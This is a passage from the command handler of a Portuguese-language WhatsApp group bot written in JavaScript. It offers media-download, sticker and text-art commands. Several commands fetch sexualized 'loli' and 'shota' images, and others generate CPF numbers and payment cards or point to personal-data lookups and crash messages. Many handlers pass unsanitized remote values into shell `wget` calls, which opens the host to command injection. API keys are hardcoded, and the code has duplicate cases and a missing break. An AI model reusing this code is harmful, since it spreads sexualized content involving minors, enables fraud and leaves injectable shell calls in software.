					var gbl16 = gh7.split("|")[0];
					var gbl26 = gh7.split("|")[1];
					var gbl36 = gh7.split("|")[2];
					anu = await fetchJson(`https://api.vhtear.com/harijadian?tgl=${gbl16}&bln=${gbl26}&thn=${gbl36}&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
					reply(anu.result.hasil)
					break
                   case 'modapk':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, modapk(prefix), text, { quoted: mek })
                    break
                   case 'gbin':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, gbin(prefix), text, { quoted: mek })
                    break
                   case 'cs':
                   case 'consultas':
                   case 'pux':
                   case 'puxadas':
                    client.sendMessage(from, cs(prefix), text, { quoted: mek })
                    break                    
                   case 'gpessoa':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, gpessoa(prefix), text, { quoted: mek })
                    break
                   case 'destrava':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, destrava(prefix), text, { quoted: mek })
                    break
                   case 'pack':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, pack(prefix), text, { quoted: mek })
                    break
                   case 'chentai':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, chentai(prefix), text, { quoted: mek })
                    break
                   case 'gcpf':
                    if (!isPremium) return reply(mess.only.premium)
                    client.sendMessage(from, gcpf(prefix), text, { quoted: mek })
                    break
				case 'ytmp4':
					if (args.length < 1) return reply('Cadê o url, hum?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Título* : ${anu.title}`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})
					break
				case 'n':
					if (args.length < 1) return reply('Cadê o url, hum?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Título do anime* : ${anu.title}\n\n*AGUARDE, ENVIANDO O VÍDEO DO ANIME.*`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})
					break
		case 'iri':
			client.sendPtt(from, './lindy/iri.mp3', {quoted: mek, ptt:true})
			break
				case 'ytmp':
					if (args.length < 1) return reply('Cadê o url, hum?')
					anu = await fetchJson(`https://api.vhtear.com/ytmp3?query=${body.slice(7)}&apikey=OOute55hhUyiwy772999she88982665000kjuGaGh`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Title* : ${anu.title}\n*Filesize* : ${anu.size}`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp3', filename: `${anu.title}.mp3`, quoted: mek})
					break
   case 'ytmp3':
  if (args.length < 1) return reply(`Cade o url jovem?`)
  reply(mess.wait)
  play = body.slice(7)
  if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Format link salah, gunakan link youtube')
  try {
  anu = await fetchJson(`https://api.zeks.xyz/api/ytmp3/2?url=${play}&apikey=apivinz`)
  infomp3 = `*Audio Encontrado*\n‣ Titulo : ${anu.result.title}\n‣ Fonte : ${anu.result.source}\n‣ Tamanho : ${anu.result.size}\n\n_Mandar arquivo por favor espere_\n\n_Se o audio nao aparecer, baixe-o usando o link abaixo_\n‣ *link* : ${anu.result.link}`
  buffer = await getBuffer(anu.result.thumb)
  lagu = await getBuffer(anu.result.link)
  client.sendMessage(from, buffer, image, {
quoted: mek, caption: infomp3
  })
  client.sendMessage(from, lagu, audio, {
mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek
  })
  await limitAdd(sender)
  } catch {
    reply(mess.ferr)
  }
  break
				case 'game':
				
					anu = await fetchJson(`http://rt-files.000webhostapp.com/tts.php?apikey=rasitech`, {method: 'get'})
					setTimeout( () => {
					client.sendMessage(from, '*➸ Responda :* '+anu.result.jawaban+'\n'+anu.result.desk, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Outro segundo…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Outro segundo_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Outro segundo_…', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, anu.result.soal, text, { quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					break
				case 'travas':
                                        tels = body.slice(4)              
                                        var num = mek.participant
                                        const fku = {
                                                text: `@${num.split("@s.whatsapp.net")[0]} *Enviando ?? para ${tels}*`,
                                                contextInfo: { mentionedJid: [num] }
                                        }
                                        client.sendMessage(from, fku, text, {quoted: mek})
				const afk = fs.readFileSync('./dapganz/afk');
                client.sendMessage(from, afk, MessageType.image, {quoted: mek, caption: '*pronto!!*'})
                 break 					
                case 'quotemaer':
					var gh = body.slice(12)
					var quote = gh.split("|")[0];
					var wm = gh.split("|")[1];
					var bg = gh.split("|")[2];
					const pref = `Usage: \n.}quotemaker teks | marca d'água | tema\n\nEx :\n${prefix}quotemaker este é um exemplo | bicit | aleatório`
					if (args.length < 1) return reply(pref)
					reply(mess.wait)
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${quote}&author=${wm}&tipe=${bg}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {caption: 'Nih dah jadi kak', quoted: mek})
					break					
                	case 'galaxtext':
					if (args.length < 1) return reply('o que você quer tio')
					teks = body.slice(12)
					if (teks.length > 8) return reply('O texto é longo, com até 8 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/galaxytext?text=${teks}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
                case 'phlogo':
					var gh = body.slice(10)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/textpro?theme=pornhub&text1=${gbl1}&text2=${gbl2}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'primbonjodoh':
					var gh = body.slice(14)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					anu = await fetchJson(`https://api.vhtear.com/primbonjodoh?nama=${gbl1}&pasangan=${gbl2}&apikey=ANTIGRATISNIHANJENKKK`)
					reply(anu.result.hasil)
					break
				case 'ramaljadian':
					var gh = body.slice(10)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					var gbl3 = gh.split("|")[2];
					anu = await fetchJson(`https://api.vhtear.com/harijadian?tgl=${gbl1}&bln=${gbl2}&thn=${gbl3}&apikey=ANTIGRATISNIHANJENKKK`)
					reply(anu.result.hasil)
					break
				case 'encode64':

				encode64 = `${body.slice(10)}`
				anu = await fetchJson(`https://api.i-tech.id/hash/bs64?key=${TechApi}&type=encode&string=${encode64}`, {method: 'get'})
				frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break 
				case 'decode64':

				decode64 = `${body.slice(10)}`
					anu = await fetchJson(`https://api.i-tech.id/hash/bs64?key=${TechApi}&type=decode&string=${decode64}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'decode32':

				decode32 = `${body.slice(10)}`
					anu = await fetchJson(`https://api.i-tech.id/hash/bs32?key=${TechApi}&type=decode&string=${decode32}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encode32':

				encode32 = `${body.slice(10)}`
					anu = await fetchJson(`https://api.i-tech.id/hash/bs32?key=${TechApi}&type=encode&string=${encode32}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encbinary':

				encbinary = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'decbinary':

				decbin = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encoctal':

				encoc = `${body.slice(10)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/octal/?encode=${encoc}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender)
					break  
				case 'decoctal':

				decoc = `${reply(mess.wait).slice(10)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/octal/?decode=${decoc}`, {method: 'get'})
					frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'becrypt':

				becry = `${body.slice(10)}`
				anu = await fetchJson(`https://api.i-tech.id/hash/bcrypt?key=${TechApi}&string=${becry}`, {method: 'get'})
				frhan.sendMessage(from, `${anu.result}`, text, {quoted: mek})
				await limitAdd(sender) 
				break 
					case 'hashidentifier':

					  hash = `${body.slice(16)}`
					  anu = await fetchJson(`https://freerestapi.herokuapp.com/api/v1/hash-identifier?hash=${hash}`)
					  hasilhash = `Tipe: *${anu.hash_type}*\nChar Tipe: *${anu.char_type}*`
					  frhan.sendMessage(from, hasilhash, text, {quoted: mek})
					  await limitAdd(sender)
					  break 
				case 'testing':
					var gh = body.slice(5)
					var gbl3 = gh.split("|")[0];
					var gbl4 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/watercolour?text1=${gbl3}&text2=${gbl4}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
case 'cep1':
                    if (args.length < 1) return reply('Cade O Cep? ')
                    anu = await fetchJson(`https://viacep.com.br/ws/${body.slice(10)}/json/`)
			        base1 = `🔎 OLAF CONSULTAS / BASE 1 🔎

➳ ENDEREÇO: ${anu.logradouro}
➳ CEP: ${anu.cep}
📌 BY: OLAF 𝐵𝑂𝑇 `
			        reply(base1)
				case 'snowrite':
					var gh = body.slice(10)
					var gbl7 = gh.split("|")[0];
					var gbl8 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/snowwrite?text1=${gbl7}&text2=${gbl8}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'marvelogo':
					var gh = body.slice(9)
					var gbl5 = gh.split("|")[0];
					var gbl6 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/marvellogo?text1=${gbl5}&text2=${gbl6}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'lovemake':
					if (args.length < 1) return reply('Cadê o texto, hum')
					love = body.slice(10)
					if (love.length > 12) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${love}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: ' '+love})
					break
				case 'thunder':
					if (args.length < 1) return reply('Cadê o texto, hum')
					thun = body.slice(9)
					if (thun.length > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/thundertext?text=${thun}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: ' '+thun})
					break
                case 'stiltext':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(11)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      buff = await getBuffer(`https://api.vhtear.com/silktext?text=${gl1}&text2=${gl2}&apikey=ANTIGRATISNIHANJENKKK`)
                      reply(mess.wait)
                      client.sendMessage(from, buff, image, {quoted: mek, caption: 'thund ni '+gh})
                      break
                case 'testing':
					var gh = body.slice(9)
					coli1 = gh.split("|")[0];
					coli2 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto?')
					reply(mess.wait)
					buffer = await getBuffer(`https://zeksapi.herokuapp.com/api/watercolour?text1=${coli1}&text2=${coli2}&apikey=xptnbot352`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'testing2':
					var gh = body.slice(9)
					coli1 = gh.split("|")[0];
					coli2 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto?')
					reply(mess.wait)
					party = await getBuffer(`https://api.vhtear.com/partytext?text=${coli1}&text2=${coli2}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, party, image, {quoted: mek})
					break
//gif					
				case 'hubgif':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hug?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
					case 'tampar':
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					buffer = await getBuffer('https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif', {method: 'get'})
					exec(`wget ${buffer.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
				case 'blowgif':
					if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'giphyk':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await getBuffer(`https://media3.giphy.com/media/2uI9ggG1AC907phSea/giphy.gif`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, gif, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'kissgif':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'shota':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomshota?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'figmo':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
				   data = fs.readFileSync('./olaf/mebro.webp');
                   jsonData = JSON.parse(data);
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, data, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'figuno':
					cry = getRandom('.png')
					rano = getRandom('.webp')
				   anu = fs.readFileSync('./olaf/mebro.webp');
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
		case 'figom':
			ranp = getRandom('.png')
			rano = getRandom('.webp')
		     hasil = fs.readFileSync('./olaf/mebro.webp');
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			if (err) return reply(mess.error.stick)
			buffer = fs.readFileSync(rano)
			client.sendMessage(from, buffer, sticker, {quoted: mek})
			})
			break
				case 'hentaifig':
				   if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 	
				case 'nekofig':
					if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'lolifig':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=${TobzApi}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 
				case 'dogfigu':
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await getBuffer(`https://media4.giphy.com/media/UuebWyG4pts3rboawU/giphy.gif`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 	
				case 'attp':
			    	if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://api.xteam.xyz/attp?file&text=${teks}`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender) 
					break 						
                case 'ninjalogo':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(11)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      reply(mess.wait)
                      anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=ninjalogo&text1=${gl1}&text2=${gl2}`, {method: 'get'})
                      buff = await getBuffer(anu.result)
                      client.sendMessage(from, buff, image, {quoted: mek})
                      break
		case 'tahta':
                tahta = `${body.slice(7)}`
                     if (args.length < 1) return reply('Cadê o texto, mano??')
                     if (args.length > 10) return reply('mínimo 10 linhas')
                     buff = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${tahta}&apikey=apivinz`, {method: 'get'})
                     client.sendMessage(from, buff, image, {quoted: mek, caption: `Tesouro do trono ${tahta}`})
                  await limitAdd(sender) 
                  break  
                    case 'glitch':
                    gh = body.slice(7)
                    teks1 = gh.split("|")[0];
                    teks2 = gh.split("|")[1];
                    data = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=glitch&text1=${teks1}&text2=${teks2}&apikey=BotWeA`, {method: 'get'})
                    hasil = await getBuffer(data.result)
                    client.sendMessage(from, hasil, image, {quoted: mek, caption: 'neh...'})
                    await limitAdd(sender)
                    break
          case 'snack':
				if (args.length < 1) return reply('Cadê o url mano?')
					if (!isUrl(args[0]) && !args[0].includes('sck')) return reply(mess.error.Iv)
                anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/sckdown?url=${args[0]}`, {method: 'get'})
               if (anu.error) return reply(anu.error)
                 sck = `「 *SNACK VIDEO DOWNLOADER* 」\n\n*• Formato:* ${anu.format}\n*• Tamanho:* ${anu.size}\n\n*ESPERE ENVIANDO POR FAVOR, NÃO SPAM*`
                bufferddd = await getBuffer('https://raw.githubusercontent.com/FarhanXCode7/termux-bot-wa/main/src/glitchtext.png')
                 reply(mess.wait)
                buff = await getBuffer(anu.result)
                frhan.sendMessage(from, bufferddd, image, {quoted: mek, caption: sck})
                frhan.sendMessage(from, buff, video, {mimetype: 'video/mp4', filename: `${anu.format}.mp4`, quoted: mek})
                await limitAdd(sender) 
                break  
				case 'party':
					if (args.length < 1) return reply(mess.blank)
					part = body.slice(7)
					if (part.length > 20) return reply('O texto é muito longo, até 20 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {caption: 'Aqui amigo (a)', quoted: mek})
					break
				case 'modoanime':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isAnime) return reply('O modo anime já está ativo')
						anime.push(from)
						fs.writeFileSync('./database/json/anime.json', JSON.stringify(anime))
						reply(`\`\`\`✓Ativado com sucesso o modo anime no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						anime.splice(from, 1)
						fs.writeFileSync('./database/json/anime.json', JSON.stringify(anime))
						reply(`\`\`\`✓Modo anime desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
					case 'antiracismo':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isAntiRacismo) return reply('O modo antiracismo já está ativo')
						antiracismo.push(from)
						fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
						reply(`\`\`\`✓Ativado com sucesso o modo antiracismo no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						antiracismo.splice(from, 1)
						fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
						reply(`\`\`\`✓Modo antiracismo desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
					case 'antihomofobia':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isAntiHomofobia) return reply('O modo antihomofobia já está ativo')
						antihomofobia.push(from)
						fs.writeFileSync('./database/json/antihomofobia.json', JSON.stringify(antihomofobia))
						reply(`\`\`\`✓Ativado com sucesso o modo antihomofobia no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						antihomofobia.splice(from, 1)
						fs.writeFileSync('./database/json/antihomofobia.json', JSON.stringify(antihomofobia))
						reply(`\`\`\`✓Modo antihomofobia desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
				case 'atris':
				client.updatePresence(from, Presence.composing) 
				 data = fs.readFileSync('./src/18.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 reply('NÃO COMEÇA BRO')
                 randTeks = randKey.teks
                 client.sendMessage(from, randBokep, image, {quoted: mek, caption: randTeks})
				break
				case 'gcpf2':
				client.updatePresence(from, Presence.composing) 
				 data = fs.readFileSync('./olaf/gcpf2.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 reply('Gerando cpf, caso falhe tente novamente.')
                 randTeks = randKey.teks
                 client.sendMessage(from, randBokep, image, {quoted: mek, caption: randTeks})
				break
				case 'gcard':
				client.updatePresence(from, Presence.composing) 
				 data = fs.readFileSync('./olaf/gcard.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 reply('Gerando cartão, caso falhe tente novamente.')
                 randTeks = randKey.teks
                 client.sendMessage(from, randBokep, image, {quoted: mek, caption: randTeks})
				break
				case 'ftlit':
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Em quem você quer dar o fatality?')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				reply('espera um pokin uai')
                ghost = mek.participant
				rate = body.slice(1)		
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		     	 reply(`${pushname} estou fazendo seu fatality no @${mentidn.split('@')[0]}`)
				 data = fs.readFileSync('./olaf/mortal.js');
                 jsonData = JSON.parse(data);
